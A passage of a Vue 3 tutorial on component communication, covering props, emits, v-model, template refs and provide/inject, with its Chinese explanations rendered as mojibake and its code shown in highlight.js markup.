<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// æ–¹å¼1ï¼šç®€å•å®šä¹‰</span>
<span class="hljs-comment">// defineProps(['title', 'user', 'count'])</span>

<span class="hljs-comment">// æ–¹å¼2ï¼šå¸¦ç±»å‹éªŒè¯ï¼ˆæ¨èï¼‰</span>
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">title</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">String</span>,
    <span class="hljs-attr">required</span>: <span class="hljs-literal">true</span>
  },
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Object</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-function">() =&gt;</span> ({})
  },
  <span class="hljs-attr">count</span>: {
    <span class="hljs-attr">type</span>: <span class="hljs-title class_">Number</span>,
    <span class="hljs-attr">default</span>: <span class="hljs-number">0</span>
  }
})

<span class="hljs-comment">// æ–¹å¼3ï¼šä½¿ç”¨ TypeScriptï¼ˆæœ€ä½³å®è·µï¼‰</span>
interface <span class="hljs-title class_">Props</span> {
  <span class="hljs-attr">title</span>: string
  <span class="hljs-attr">user</span>: {
    <span class="hljs-attr">name</span>: string
    <span class="hljs-attr">age</span>: number
    <span class="hljs-attr">email</span>: string
  }
  count?: number
}

defineProps&lt;<span class="hljs-title class_">Props</span>&gt;()
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆæ¨èå¸¦éªŒè¯ï¼Ÿ</strong></p>
<p>å®ƒèƒ½æå‰å‘ç°ä¼ å‚é”™è¯¯ï¼Œæ¯”å¦‚æŠŠå­—ç¬¦ä¸²ä¼ ç»™äº† countï¼ŒVue ä¼šåœ¨æ§åˆ¶å°æŠ¥é”™ï¼Œé¿å…çº¿ä¸Šbugã€‚</p>
<hr/>
<h3 data-id="heading-2">Emitsï¼šå­ä¼ çˆ¶çš„äº‹ä»¶æœºåˆ¶</h3>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå­ç»„ä»¶éœ€è¦é€šçŸ¥çˆ¶ç»„ä»¶æœ‰äº‹å‘ç”Ÿï¼Œæ¯”å¦‚è¡¨å•æäº¤ã€æŒ‰é’®ç‚¹å‡»ã€è¾“å…¥å˜åŒ–ç­‰ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å­ç»„ä»¶ ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"handleButtonClick"</span>&gt;</span>é€šçŸ¥çˆ¶ç»„ä»¶<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> 
      <span class="hljs-attr">:value</span>=<span class="hljs-string">"inputValue"</span> 
      @<span class="hljs-attr">input</span>=<span class="hljs-string">"handleInputChange"</span>
      <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¾“å…¥å†…å®¹..."</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// å®šä¹‰å¯è§¦å‘çš„äº‹ä»¶</span>
<span class="hljs-keyword">const</span> emit = <span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'button-clicked'</span>, <span class="hljs-string">'input-changed'</span>, <span class="hljs-string">'update:modelValue'</span>])

<span class="hljs-keyword">const</span> inputValue = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleButtonClick</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-comment">// è§¦å‘äº‹ä»¶å¹¶ä¼ é€’æ•°æ®</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'button-clicked'</span>, {
    <span class="hljs-attr">message</span>: <span class="hljs-string">'æŒ‰é’®è¢«ç‚¹å‡»äº†ï¼'</span>,
    <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
  })
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleInputChange</span> = (<span class="hljs-params">event</span>) =&gt; {
  inputValue.<span class="hljs-property">value</span> = event.<span class="hljs-property">target</span>.<span class="hljs-property">value</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'input-changed'</span>, inputValue.<span class="hljs-property">value</span>)
  
  <span class="hljs-comment">// æ”¯æŒ v-model çš„æ›´æ–°æ–¹å¼</span>
  <span class="hljs-title function_">emit</span>(<span class="hljs-string">'update:modelValue'</span>, inputValue.<span class="hljs-property">value</span>)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- çˆ¶ç»„ä»¶ Parent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> 
      @<span class="hljs-attr">button-clicked</span>=<span class="hljs-string">"handleChildButtonClick"</span>
      @<span class="hljs-attr">input-changed</span>=<span class="hljs-string">"handleChildInputChange"</span>
    /&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">v-if</span>=<span class="hljs-string">"lastEvent"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æœ€åæ”¶åˆ°çš„äº‹ä»¶ï¼š{{ lastEvent.type }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>æ•°æ®ï¼š{{ lastEvent.data }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> lastEvent = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildButtonClick</span> = (<span class="hljs-params">data</span>) =&gt; {
  lastEvent.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'button-clicked'</span>,
    <span class="hljs-attr">data</span>: data
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ”¶åˆ°å­ç»„ä»¶æ¶ˆæ¯ï¼š'</span>, data)
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">handleChildInputChange</span> = (<span class="hljs-params">value</span>) =&gt; {
  lastEvent.<span class="hljs-property">value</span> = {
    <span class="hljs-attr">type</span>: <span class="hljs-string">'input-changed'</span>,
    <span class="hljs-attr">data</span>: value
  }
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'è¾“å…¥å†…å®¹ï¼š'</span>, value)
}
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>å…³é”®ç‚¹ï¼š</strong></p>
<ul>
<li>å­ç»„ä»¶ä¸ç›´æ¥ä¿®æ”¹çˆ¶ç»„ä»¶æ•°æ®ï¼Œè€Œæ˜¯å‘å‡ºè¯·æ±‚ï¼Œç”±çˆ¶ç»„ä»¶å†³å®šå¦‚ä½•å¤„ç†ã€‚</li>
<li>è¿™ç§è§£è€¦è®¾è®¡è®©ç»„ä»¶æ›´å¯å¤ç”¨ã€æ›´æ˜“æµ‹è¯•ã€‚</li>
</ul>
<hr/>
<h2 data-id="heading-3">2. v-modelï¼šåŒå‘ç»‘å®šçš„è¯­æ³•ç³–</h2>
<p>v-model åœ¨ Vue3 ä¸­å˜å¾—æ›´åŠ å¼ºå¤§ï¼Œæ”¯æŒå¤šä¸ª v-model ç»‘å®šã€‚</p>
<h3 data-id="heading-4">åŸºç¡€ç”¨æ³•</h3>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- çˆ¶ç»„ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">CustomInput</span> <span class="hljs-attr">v-model</span>=<span class="hljs-string">"username"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å½“å‰ç”¨æˆ·åï¼š{{ username }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    
    <span class="hljs-comment">&lt;!-- å¤šä¸ª v-model --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">UserForm</span>
      <span class="hljs-attr">v-model:name</span>=<span class="hljs-string">"userName"</span>
      <span class="hljs-attr">v-model:email</span>=<span class="hljs-string">"userEmail"</span>
      <span class="hljs-attr">v-model:age</span>=<span class="hljs-string">"userAge"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> username = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userName = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userEmail = <span class="hljs-title function_">ref</span>(<span class="hljs-string">''</span>)
<span class="hljs-keyword">const</span> userAge = <span class="hljs-title function_">ref</span>(<span class="hljs-number">0</span>)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å­ç»„ä»¶ CustomInput.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"custom-input"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>ç”¨æˆ·åï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
      <span class="hljs-attr">:value</span>=<span class="hljs-string">"modelValue"</span>
      @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:modelValue', $event.target.value)"</span>
      <span class="hljs-attr">class</span>=<span class="hljs-string">"input-field"</span>
    /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>([<span class="hljs-string">'modelValue'</span>])
<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:modelValue'</span>])
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å­ç»„ä»¶ UserForm.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"user-form"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>å§“åï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"name"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:name', $event.target.value)"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>é‚®ç®±ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"email"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:email', $event.target.value)"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"email"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"form-group"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">label</span>&gt;</span>å¹´é¾„ï¼š<span class="hljs-tag">&lt;/<span class="hljs-name">label</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">input</span>
        <span class="hljs-attr">:value</span>=<span class="hljs-string">"age"</span>
        @<span class="hljs-attr">input</span>=<span class="hljs-string">"$emit('update:age', parseInt($event.target.value) || 0)"</span>
        <span class="hljs-attr">type</span>=<span class="hljs-string">"number"</span>
      /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-title function_">defineProps</span>({
  <span class="hljs-attr">name</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">email</span>: <span class="hljs-title class_">String</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-title class_">Number</span>
})

<span class="hljs-title function_">defineEmits</span>([<span class="hljs-string">'update:name'</span>, <span class="hljs-string">'update:email'</span>, <span class="hljs-string">'update:age'</span>])
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><code>v-model</code>çš„æ ¸å¿ƒä¼˜åŠ¿ï¼š</p>
<ul>
<li>è¯­æ³•ç®€æ´ï¼Œå‡å°‘æ ·æ¿ä»£ç </li>
<li>ç¬¦åˆåŒå‘ç»‘å®šçš„ç›´è§‰</li>
<li>æ”¯æŒå¤šä¸ªv-modelç»‘å®š</li>
<li>ç±»å‹å®‰å…¨ï¼ˆé…åˆTypeScriptï¼‰</li>
</ul>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šè‡ªå®šä¹‰è¡¨å•æ§ä»¶ï¼ˆå¦‚æ—¥æœŸé€‰æ‹©å™¨ã€å¯Œæ–‡æœ¬ç¼–è¾‘å™¨ï¼‰éœ€è¦åŒå‘ç»‘å®šã€‚</p>
<hr/>
<h2 data-id="heading-5">3. Ref / æ¨¡æ¿å¼•ç”¨ï¼šç›´æ¥æ“ä½œç»„ä»¶</h2>
<p>å½“éœ€è¦ç›´æ¥è®¿é—®å­ç»„ä»¶æˆ– DOM å…ƒç´ æ—¶ï¼Œæ¨¡æ¿å¼•ç”¨æ˜¯æœ€ä½³é€‰æ‹©ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- çˆ¶ç»„ä»¶ --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"parent"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ChildComponent</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"childRef"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">CustomForm</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"formRef"</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"videoRef"</span> <span class="hljs-attr">controls</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"./movie.mp4"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"video/mp4"</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>
    
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"controls"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"focusInput"</span>&gt;</span>èšç„¦è¾“å…¥æ¡†<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"getChildData"</span>&gt;</span>è·å–å­ç»„ä»¶æ•°æ®<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"playVideo"</span>&gt;</span>æ’­æ”¾è§†é¢‘<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">button</span> @<span class="hljs-attr">click</span>=<span class="hljs-string">"validateForm"</span>&gt;</span>éªŒè¯è¡¨å•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted, nextTick } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// åˆ›å»ºå¼•ç”¨</span>
<span class="hljs-keyword">const</span> childRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> formRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> videoRef = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// ç¡®ä¿ DOM æ›´æ–°åè®¿é—®</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">focusInput</span> = <span class="hljs-keyword">async</span> (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">await</span> <span class="hljs-title function_">nextTick</span>()
  childRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focusInput</span>()
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">getChildData</span> = (<span class="hljs-params"/>) =&gt; {
  <span class="hljs-keyword">if</span> (childRef.<span class="hljs-property">value</span>) {
    <span class="hljs-keyword">const</span> data = childRef.<span class="hljs-property">value</span>.<span class="hljs-title function_">getData</span>()
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­ç»„ä»¶æ•°æ®ï¼š'</span>, data)
  }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">playVideo</span> = (<span class="hljs-params"/>) =&gt; {
  videoRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">play</span>()
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">validateForm</span> = (<span class="hljs-params"/>) =&gt; {
  formRef.<span class="hljs-property">value</span>?.<span class="hljs-title function_">validate</span>()
}

<span class="hljs-comment">// ç»„ä»¶æŒ‚è½½åè®¿é—®</span>
<span class="hljs-title function_">onMounted</span>(<span class="hljs-function">() =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'å­ç»„ä»¶å®ä¾‹ï¼š'</span>, childRef.<span class="hljs-property">value</span>)
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- å­ç»„ä»¶ ChildComponent.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"child"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">"inputEl"</span> <span class="hljs-attr">type</span>=<span class="hljs-string">"text"</span> <span class="hljs-attr">placeholder</span>=<span class="hljs-string">"è¯·è¾“å…¥..."</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>å†…éƒ¨æ•°æ®ï¼š{{ internalData }}<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { ref, onMounted } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-keyword">const</span> inputEl = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> internalData = <span class="hljs-title function_">ref</span>(<span class="hljs-string">'è¿™æ˜¯å†…éƒ¨æ•°æ®'</span>)

<span class="hljs-comment">// æš´éœ²ç»™çˆ¶ç»„ä»¶çš„æ–¹æ³•å’Œæ•°æ®</span>
<span class="hljs-title function_">defineExpose</span>({
  <span class="hljs-attr">focusInput</span>: <span class="hljs-function">() =&gt;</span> {
    inputEl.<span class="hljs-property">value</span>?.<span class="hljs-title function_">focus</span>()
  },
  <span class="hljs-attr">getData</span>: <span class="hljs-function">() =&gt;</span> {
    <span class="hljs-keyword">return</span> {
      <span class="hljs-attr">internalData</span>: internalData.<span class="hljs-property">value</span>,
      <span class="hljs-attr">timestamp</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>()
    }
  },
  internalData
})
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šéœ€è¦è°ƒç”¨å­ç»„ä»¶æ–¹æ³•ï¼ˆå¦‚å¼¹çª—æ‰“å¼€ï¼‰ã€èšç„¦è¾“å…¥æ¡†ã€æ“ä½œåŸç”Ÿå…ƒç´ ï¼ˆå¦‚ video æ’­æ”¾ï¼‰ã€‚</p>
<h2 data-id="heading-6">4. Provide / Injectï¼šè·¨å±‚çº§æ•°æ®ä¼ é€’</h2>
<p>è§£å†³"prop é€çº§ä¼ é€’"é—®é¢˜ï¼Œå®ç°ç¥–å…ˆä¸åä»£ç»„ä»¶çš„ç›´æ¥é€šä¿¡ã€‚</p>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ ¹ç»„ä»¶ App.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"main-content"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">Sidebar</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">ContentArea</span> /&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">Footer</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-keyword">import</span> { provide, ref, reactive, computed } <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span>

<span class="hljs-comment">// æä¾›ç”¨æˆ·ä¿¡æ¯</span>
<span class="hljs-keyword">const</span> currentUser = <span class="hljs-title function_">ref</span>({
  <span class="hljs-attr">id</span>: <span class="hljs-number">1</span>,
  <span class="hljs-attr">name</span>: <span class="hljs-string">'å¼ ä¸‰'</span>,
  <span class="hljs-attr">role</span>: <span class="hljs-string">'admin'</span>,
  <span class="hljs-attr">permissions</span>: [<span class="hljs-string">'read'</span>, <span class="hljs-string">'write'</span>, <span class="hljs-string">'delete'</span>]
})

<span class="hljs-comment">// æä¾›åº”ç”¨é…ç½®</span>
<span class="hljs-keyword">const</span> appConfig = <span class="hljs-title function_">reactive</span>({
  <span class="hljs-attr">theme</span>: <span class="hljs-string">'dark'</span>,
  <span class="hljs-attr">language</span>: <span class="hljs-string">'zh-CN'</span>,
  <span class="hljs-attr">apiBaseUrl</span>: <span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">env</span>.<span class="hljs-property">VITE_API_URL</span>
})

<span class="hljs-comment">// æä¾›æ–¹æ³•</span>
<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateUser</span> = (<span class="hljs-params">newUserData</span>) =&gt; {
  currentUser.<span class="hljs-property">value</span> = { ...currentUser.<span class="hljs-property">value</span>, ...newUserData }
}

<span class="hljs-keyword">const</span> <span class="hljs-title function_">updateConfig</span> = (<span class="hljs-params">key, value</span>) =&gt; {
  appConfig[key] = value
}

<span class="hljs-comment">// è®¡ç®—å±æ€§</span>
<span class="hljs-keyword">const</span> userPermissions = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> currentUser.<span class="hljs-property">value</span>.<span class="hljs-property">permissions</span>)

<span class="hljs-comment">// æä¾›æ•°æ®å’Œæ–¹æ³•</span>
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'currentUser'</span>, currentUser)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'appConfig'</span>, appConfig)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateUser'</span>, updateUser)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'updateConfig'</span>, updateConfig)
<span class="hljs-title function_">provide</span>(<span class="hljs-string">'userPermissions'</span>, userPermissions)
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- æ·±å±‚åµŒå¥—çš„ç»„ä»¶ ContentArea.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">class</span>=<span class="hljs-string">"content-area"</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">UserProfile</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">ArticleList</span> /&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span>

<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">setup</span>&gt;</span><span class="javascript">
<span class="hljs-comment">// è¿™ä¸ªç»„ä»¶ä¸éœ€è¦å¤„ç† propsï¼Œç›´æ¥æ¸²æŸ“å­ç»„ä»¶</span>
</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
</code></pre>
<pre><code class="hljs language-html" lang="html"><span class="hljs-comment">&lt;!-- ä½¿ç”¨æ³¨å…¥çš„ç»„ä»¶ UserProfile.vue --&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span>
